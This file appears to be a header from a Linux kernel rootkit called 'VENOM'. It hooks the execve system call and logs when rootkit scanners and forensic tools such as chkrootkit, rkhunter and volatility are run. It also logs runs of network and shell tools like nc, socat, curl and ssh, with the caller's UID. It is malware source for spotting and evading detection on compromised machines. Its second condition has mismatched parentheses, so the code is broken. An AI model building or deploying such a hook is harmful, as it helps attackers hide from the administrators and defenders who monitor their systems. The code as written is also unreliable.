#ifndef COMMANDS_HACK 
#define COMMANDS_HACK 

#include "../include/headers.h"



static asmlinkage long (*orig_execve)(const struct pt_regs *regs);


notrace static asmlinkage long hooked_execve(const struct pt_regs *regs) {
    const char __user *filename = (const char __user *)regs->di;
    char kfilename[256];
    
    if (strncpy_from_user(kfilename, filename, sizeof(kfilename) - 1) > 0) {
        const char *basename = strrchr(kfilename, '/');
        basename = basename ? basename + 1 : kfilename;
        
        if (strstr(basename, "chkrootkit") ||
            strstr(basename, "rkhunter") ||
            strstr(basename, "lynis") ||
            strstr(basename, "tiger") ||
            strstr(basename, "unhide") ||
            strstr(basename, "volatility")) {
            TLOG_CRIT("[VENOM] SECURITY TOOL DETECTED: %s", basename);
        }
        
        if (strstr(basename, "nc") || strstr(basename, "ncat") ||
            strstr(basename, "socat") || strstr(basename, "telnet") || 
            strstr(basename, "python") || strstr(basename, "php") || 
            strstr(basename, "node") || strstr(basename, "nodejs")) || 
            strstr(basename, "curl") || strstr(basename, "wget") || 
            strstr(basename, "tcpdump") || strstr(basename, "tshark") || 
            strstr(basename, "ftp") || strstr(basename, "ssh"){
            TLOG_CRIT("[VENOM] Binary exec: %s by UID %d", basename, current_uid().val);
        }
        
    }
    
    return orig_execve(regs);

} 

#endif 

